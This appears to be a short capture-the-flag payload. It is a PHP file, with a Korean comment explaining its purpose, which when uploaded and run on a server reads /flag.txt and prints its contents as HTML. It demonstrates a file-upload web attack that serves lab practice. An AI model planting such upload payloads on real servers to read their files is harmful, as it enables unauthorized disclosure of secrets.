<!-- uploads 경로의 상위 폴더에 존재하는 flag.txt의 내용을 html로 출력하면 되는 php 코드 -->

<?php
    $fp = file_get_contents("/flag.txt");
    echo $fp;
?>